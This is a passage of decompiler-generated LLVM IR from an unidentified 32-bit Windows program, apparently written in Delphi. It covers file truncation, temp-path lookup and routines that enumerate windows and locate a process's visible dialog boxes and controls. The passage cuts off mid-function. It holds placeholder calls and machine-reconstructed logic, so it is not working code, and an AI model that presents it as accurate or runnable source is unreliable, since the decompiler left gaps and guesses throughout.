  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1599
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1599
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1600
  %19 = call i32 @function_4046d4(), !insn.addr !1601
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406acb

dec_label_pc_406acb:                              ; preds = %dec_label_pc_4069b2, %dec_label_pc_406996, %dec_label_pc_40692c
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1602
  %21 = load i32, i32* %20, align 4, !insn.addr !1602
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1603
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1604
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1604
  store i32 4221677, i32* %23, align 4, !insn.addr !1604
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1605
  ret i32 %24, !insn.addr !1606
}

define i32 @function_406ae6() local_unnamed_addr {
dec_label_pc_406ae6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1607
  ret i32 %0, !insn.addr !1607
}

define i32 @function_406aeb() local_unnamed_addr {
dec_label_pc_406aeb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1608
}

define i32 @function_406aed(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406aed:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1609
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1609
  %3 = load i32, i32* %2, align 4, !insn.addr !1609
  ret i32 %3, !insn.addr !1610
}

define i32 @function_406b24() local_unnamed_addr {
dec_label_pc_406b24:
  %esp.2.reg2mem = alloca i32, !insn.addr !1611
  %esp.1.reg2mem = alloca i32, !insn.addr !1611
  %esi.0.reg2mem = alloca i32, !insn.addr !1611
  %esp.0.reg2mem = alloca i32, !insn.addr !1611
  %ebx.0.reg2mem = alloca i32, !insn.addr !1611
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1612
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1613
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1613
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1613
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1614
  %2 = call i32 @function_403c88(), !insn.addr !1615
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1616
  br i1 %3, label %dec_label_pc_406c0d, label %dec_label_pc_406b52, !insn.addr !1616

dec_label_pc_406b52:                              ; preds = %dec_label_pc_406b24
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1617
  %5 = call i32 @function_4036c8(), !insn.addr !1618
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1619
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1619
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1619
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1620
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1621
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1622
  br i1 %9, label %dec_label_pc_406c0d, label %dec_label_pc_406b8e, !insn.addr !1622

dec_label_pc_406b8e:                              ; preds = %dec_label_pc_406b52
  %10 = call i32 @"@LStrClr"(), !insn.addr !1623
  %11 = call i32 @function_403c90(), !insn.addr !1624
  %12 = icmp slt i32 %11, 0, !insn.addr !1625
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1626
  br i1 %12, label %dec_label_pc_406bd8, label %dec_label_pc_406ba6, !insn.addr !1626

dec_label_pc_406ba6:                              ; preds = %dec_label_pc_406b8e
  %13 = add i32 %11, 1, !insn.addr !1627
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1628
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1628
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1628
  br label %dec_label_pc_406ba9, !insn.addr !1628

dec_label_pc_406ba9:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406ba6
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1629
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1629
  store i32 0, i32* %15, align 4, !insn.addr !1629
  %16 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1630
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1631
  %18 = add i32 %16, %17, !insn.addr !1631
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1631
  %20 = load i32, i32* %19, align 4, !insn.addr !1631
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1631
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1631
  store i32 %20, i32* %22, align 4, !insn.addr !1631
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1632
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1632
  store i32 ptrtoint (i32* @global_var_406c54 to i32), i32* %24, align 4, !insn.addr !1632
  %25 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1633
  %26 = or i32 %17, 4, !insn.addr !1634
  %27 = add i32 %25, %26, !insn.addr !1634
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1634
  %29 = load i32, i32* %28, align 4, !insn.addr !1634
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1634
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1634
  store i32 %29, i32* %31, align 4, !insn.addr !1634
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1635
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1635
  store i32 ptrtoint ([3 x i8]* @global_var_406c60 to i32), i32* %33, align 4, !insn.addr !1635
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1636
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1637
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1638
  %37 = icmp eq i32 %36, 0, !insn.addr !1638
  %38 = icmp eq i1 %37, false, !insn.addr !1639
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1639
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1639
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1639
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1639
  br i1 %38, label %dec_label_pc_406ba9, label %dec_label_pc_406bd8, !insn.addr !1639

dec_label_pc_406bd8:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406b8e
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1620
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1640
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1641
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1641
  store i32 0, i32* %42, align 4, !insn.addr !1641
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1642
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1642
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1642
  store i32 %45, i32* %44, align 4, !insn.addr !1642
  %46 = call i32 @function_4034c8(), !insn.addr !1643
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1644
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1644
  store i32 %46, i32* %48, align 4, !insn.addr !1644
  %49 = call i32 @function_403720(), !insn.addr !1645
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1646
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1646
  store i32 %49, i32* %51, align 4, !insn.addr !1646
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1647
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1647
  store i32 %39, i32* %53, align 4, !insn.addr !1647
  %54 = call i32 @function_40446c(), !insn.addr !1648
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1649
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1649
  store i32 %39, i32* %56, align 4, !insn.addr !1649
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1650
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1651
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1651
  store i32 %39, i32* %59, align 4, !insn.addr !1651
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1652
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1653
  br label %dec_label_pc_406c0d, !insn.addr !1653

dec_label_pc_406c0d:                              ; preds = %dec_label_pc_406bd8, %dec_label_pc_406b52, %dec_label_pc_406b24
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1654
  %62 = load i32, i32* %61, align 4, !insn.addr !1654
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1655
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1656
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1656
  store i32 4221999, i32* %64, align 4, !insn.addr !1656
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1657
  ret i32 %65, !insn.addr !1658
}

define i32 @function_406c28() local_unnamed_addr {
dec_label_pc_406c28:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1659
  ret i32 %0, !insn.addr !1659
}

define i32 @function_406c2d() local_unnamed_addr {
dec_label_pc_406c2d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1660
}

define i32 @function_406c2f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406c2f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1661
}

define i32 @function_406c64() local_unnamed_addr {
dec_label_pc_406c64:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1662
  %1 = call i32 @function_4036b8(), !insn.addr !1663
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1664
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1664
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1664
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1665
  %4 = call i32 @function_403c90(), !insn.addr !1666
  %5 = icmp slt i32 %4, 0, !insn.addr !1667
  br i1 %5, label %dec_label_pc_406cec, label %dec_label_pc_406cba, !insn.addr !1668

dec_label_pc_406cba:                              ; preds = %dec_label_pc_406c64
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1669
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1670
  br label %dec_label_pc_406d38

dec_label_pc_406cec:                              ; preds = %dec_label_pc_406c64
  %8 = call i32 @function_403c88(), !insn.addr !1671
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1672
  %10 = call i32 @function_403c90(), !insn.addr !1673
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1674
  %12 = call i32 @function_403c90(), !insn.addr !1675
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1676
  %14 = call i32 @function_406b24(), !insn.addr !1677
  br label %dec_label_pc_406d38, !insn.addr !1677

dec_label_pc_406d38:                              ; preds = %dec_label_pc_406cba, %dec_label_pc_406cec
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1678
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1679
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1680
  ret i32 %16, !insn.addr !1681
}

define i32 @function_406d53() local_unnamed_addr {
dec_label_pc_406d53:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1682
  ret i32 %0, !insn.addr !1682
}

define i32 @function_406d58() local_unnamed_addr {
dec_label_pc_406d58:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1683
}

define i32 @function_406d5a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406d5a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1684
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1684
  %3 = load i32, i32* %2, align 4, !insn.addr !1684
  ret i32 %3, !insn.addr !1685
}

define i32 @function_406d64() local_unnamed_addr {
dec_label_pc_406d64:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1686
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1686
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1686
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1687
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1688
  %3 = add i32 %2, 1, !insn.addr !1688
  %4 = icmp eq i32 %3, 0, !insn.addr !1688
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1688
  %5 = icmp eq i1 %4, false, !insn.addr !1689
  br i1 %5, label %dec_label_pc_406d9c, label %dec_label_pc_406d7d, !insn.addr !1689

dec_label_pc_406d7d:                              ; preds = %dec_label_pc_406d64
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1690
  %7 = icmp eq i32 %6, 0, !insn.addr !1690
  br i1 %7, label %dec_label_pc_406d8c, label %dec_label_pc_406d87, !insn.addr !1691

dec_label_pc_406d87:                              ; preds = %dec_label_pc_406d7d
  %8 = call i32 @function_406b24(), !insn.addr !1692
  br label %dec_label_pc_406d8c, !insn.addr !1692

dec_label_pc_406d8c:                              ; preds = %dec_label_pc_406d87, %dec_label_pc_406d7d
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1693
  br label %dec_label_pc_406d9c, !insn.addr !1693

dec_label_pc_406d9c:                              ; preds = %dec_label_pc_406d8c, %dec_label_pc_406d64
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1694
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1695
  ret i32 0, !insn.addr !1696
}

define i32 @function_406daa() local_unnamed_addr {
dec_label_pc_406daa:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1697
  ret i32 %0, !insn.addr !1697
}

define i32 @function_406daf() local_unnamed_addr {
dec_label_pc_406daf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1698
}

define i32 @function_406db1(i32 %arg1) local_unnamed_addr {
dec_label_pc_406db1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1699
}

define i32 @function_406db4() local_unnamed_addr {
dec_label_pc_406db4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1700
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1700
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1700
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1701
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1702
  %3 = add i32 %2, -1, !insn.addr !1702
  %4 = icmp eq i32 %2, 0, !insn.addr !1702
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1702
  %5 = icmp eq i1 %4, false, !insn.addr !1703
  br i1 %5, label %dec_label_pc_406de8, label %dec_label_pc_406dce, !insn.addr !1703

dec_label_pc_406dce:                              ; preds = %dec_label_pc_406db4
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1704
  br label %dec_label_pc_406de8, !insn.addr !1705

dec_label_pc_406de8:                              ; preds = %dec_label_pc_406dce, %dec_label_pc_406db4
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1706
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1707
  ret i32 0, !insn.addr !1708
}

define i32 @function_406df6() local_unnamed_addr {
dec_label_pc_406df6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1709
  ret i32 %0, !insn.addr !1709
}

define i32 @function_406dfb() local_unnamed_addr {
dec_label_pc_406dfb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1710
}

define i32 @function_406dfd(i32 %arg1) local_unnamed_addr {
dec_label_pc_406dfd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1711
}

define i1 @function_406e00(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406e00:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1712
  ret i1 %0, !insn.addr !1712
}

define i32 @function_406e08() local_unnamed_addr {
dec_label_pc_406e08:
  %eax.0.reg2mem = alloca i32, !insn.addr !1713
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1714
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1715
  %2 = icmp eq i32 %1, 0, !insn.addr !1716
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1717
  br i1 %2, label %dec_label_pc_406e3e, label %dec_label_pc_406e20, !insn.addr !1717

dec_label_pc_406e20:                              ; preds = %dec_label_pc_406e08
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1714
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1718
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1718
  %7 = load i8, i8* %6, align 1, !insn.addr !1718
  %8 = icmp eq i8 %7, 92, !insn.addr !1718
  br i1 %8, label %dec_label_pc_406e30, label %dec_label_pc_406e27, !insn.addr !1719

dec_label_pc_406e27:                              ; preds = %dec_label_pc_406e20
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1720
  store i8 92, i8* %9, align 1, !insn.addr !1720
  %10 = or i32 %3, 1, !insn.addr !1721
  %11 = add i32 %1, %10, !insn.addr !1721
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1721
  store i8 0, i8* %12, align 1, !insn.addr !1721
  br label %dec_label_pc_406e30, !insn.addr !1721

dec_label_pc_406e30:                              ; preds = %dec_label_pc_406e27, %dec_label_pc_406e20
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1722
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1722
  br label %dec_label_pc_406e3e, !insn.addr !1722

dec_label_pc_406e3e:                              ; preds = %dec_label_pc_406e30, %dec_label_pc_406e08
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1723
}

define i32 @function_406e48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406e48:
  %esp.0.reg2mem = alloca i32, !insn.addr !1724
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1725
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1726
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1726
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1726
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1727
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1728
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1728
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1729
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1729
  %5 = icmp eq i1 %4, false, !insn.addr !1730
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1731
  br i1 %5, label %dec_label_pc_406eff, label %dec_label_pc_406e7f, !insn.addr !1731

dec_label_pc_406e7f:                              ; preds = %dec_label_pc_406e48
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1732
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1732
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1733
  %8 = icmp eq i32 %7, 32770, !insn.addr !1734
  %9 = icmp eq i1 %8, false, !insn.addr !1735
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1735
  br i1 %9, label %dec_label_pc_406eff, label %dec_label_pc_406e8e, !insn.addr !1735

dec_label_pc_406e8e:                              ; preds = %dec_label_pc_406e7f
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1736
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1736
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1737
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1737
  %13 = add i32 %arg1, 4, !insn.addr !1738
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1738
  %15 = load i32, i32* %14, align 4, !insn.addr !1738
  %16 = icmp eq i32 %15, %12, !insn.addr !1738
  %17 = icmp eq i1 %16, false, !insn.addr !1739
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1739
  br i1 %17, label %dec_label_pc_406eff, label %dec_label_pc_406e99, !insn.addr !1739

dec_label_pc_406e99:                              ; preds = %dec_label_pc_406e8e
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1740
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1740
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1741
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1742
  %21 = load i32, i32* %20, align 4, !insn.addr !1742
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1743
  %23 = icmp eq i32 %21, %22, !insn.addr !1743
  %24 = icmp eq i1 %23, false, !insn.addr !1744
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1744
  br i1 %24, label %dec_label_pc_406eff, label %dec_label_pc_406eaa, !insn.addr !1744

dec_label_pc_406eaa:                              ; preds = %dec_label_pc_406e99
  %25 = add i32 %arg1, 8, !insn.addr !1745
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1745
  %27 = load i32, i32* %26, align 4, !insn.addr !1745
  %28 = icmp eq i32 %27, 0, !insn.addr !1745
  br i1 %28, label %dec_label_pc_406ed4, label %dec_label_pc_406eb0, !insn.addr !1746

dec_label_pc_406eb0:                              ; preds = %dec_label_pc_406eaa
  %29 = call i32 @function_407020(), !insn.addr !1747
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1748
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1749
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406eff

dec_label_pc_406ed4:                              ; preds = %dec_label_pc_406eaa
  %32 = add i32 %arg1, 12, !insn.addr !1750
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1750
  %34 = load i32, i32* %33, align 4, !insn.addr !1750
  %35 = add i32 %arg1, 16, !insn.addr !1751
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1751
  %37 = load i32, i32* %36, align 4, !insn.addr !1751
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1752
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1752
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1752
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1752
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1752
  %43 = add i32 %arg1, 24, !insn.addr !1753
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1753
  store i32 %42, i32* %44, align 4, !insn.addr !1753
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1754
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1754
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1755
  %47 = icmp eq i1 %46, false, !insn.addr !1756
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1757
  br i1 %47, label %dec_label_pc_406eff, label %dec_label_pc_406efa, !insn.addr !1757

dec_label_pc_406efa:                              ; preds = %dec_label_pc_406ed4
  %48 = add i32 %arg1, 20, !insn.addr !1758
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1758
  store i32 %arg2, i32* %49, align 4, !insn.addr !1758
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1759
  br label %dec_label_pc_406eff, !insn.addr !1759

dec_label_pc_406eff:                              ; preds = %dec_label_pc_406eb0, %dec_label_pc_406efa, %dec_label_pc_406ed4, %dec_label_pc_406e99, %dec_label_pc_406e8e, %dec_label_pc_406e7f, %dec_label_pc_406e48
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1760
  %51 = load i32, i32* %50, align 4, !insn.addr !1760
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1761
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1762
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1762
  store i32 4222753, i32* %53, align 4, !insn.addr !1762
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1763
  ret i32 %54, !insn.addr !1764
}

define i32 @function_406f1a() local_unnamed_addr {
dec_label_pc_406f1a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1765
  ret i32 %0, !insn.addr !1765
}

define i32 @function_406f1f() local_unnamed_addr {
dec_label_pc_406f1f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1766
}

define i32 @function_406f21(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f21:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1767
}

define i32 @function_406f2c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f2c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1768
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1769
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1770
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1770
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1770
  %6 = call i32 @function_40441c(), !insn.addr !1771
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1772
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1773
  br label %dec_label_pc_406f70, !insn.addr !1773

dec_label_pc_406f70:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f2c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1772
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1772
  store i32 %7, i32* %9, align 4, !insn.addr !1772
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1774
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1774
  store i32 4222536, i32* %11, align 4, !insn.addr !1774
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1775
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1776
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1776
  store i32 1, i32* %14, align 4, !insn.addr !1776
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1777
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1778
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1778
  store i32 0, i32* %16, align 4, !insn.addr !1778
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1779
  %18 = icmp eq i1 %17, false, !insn.addr !1780
  %19 = icmp eq i1 %18, false, !insn.addr !1781
  br i1 %19, label %dec_label_pc_406f9a, label %dec_label_pc_406f8f, !insn.addr !1781

dec_label_pc_406f8f:                              ; preds = %dec_label_pc_406f70
  %20 = call i32 @function_40441c(), !insn.addr !1782
  %21 = sub i32 %20, %6, !insn.addr !1783
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1784
  %23 = icmp eq i1 %22, false, !insn.addr !1785
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1785
  br i1 %23, label %dec_label_pc_406f70, label %dec_label_pc_406f9a, !insn.addr !1785

dec_label_pc_406f9a:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f70
  ret i32 0, !insn.addr !1786
}

define i32 @function_406fb4() local_unnamed_addr {
dec_label_pc_406fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1787
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1788
}

define i32 @function_406fcc(i32 %arg1) local_unnamed_addr {
dec_label_pc_406fcc:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1789
  %edi.0.reg2mem = alloca i32, !insn.addr !1789
  %ecx.0.reg2mem = alloca i32, !insn.addr !1789
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1790
  br label %2, !insn.addr !1790

